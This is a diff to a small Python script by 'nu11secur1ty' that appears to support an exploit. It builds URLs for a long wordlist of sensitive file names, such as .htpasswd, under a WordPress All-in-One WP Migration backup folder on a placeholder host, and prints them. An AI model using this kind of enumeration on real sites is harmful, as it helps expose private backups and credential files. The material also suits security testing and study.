@@ -2,7 +2,11 @@
 # Author nu11secur1ty
 import requests
 import os
+import time
+from datetime import datetime
 
+
+target="http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/"
 exploit_list = ['!.gitignore',
 '!.htaccess',
 '!.htpasswd',
@@ -9485,4 +9489,4 @@ exploit_list = ['!.gitignore',
 '~xfs',]
 
 for ins in range(len(exploit_list)):
-	print("http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/"+exploit_list[ins])
+	print(target+exploit_list[ins])
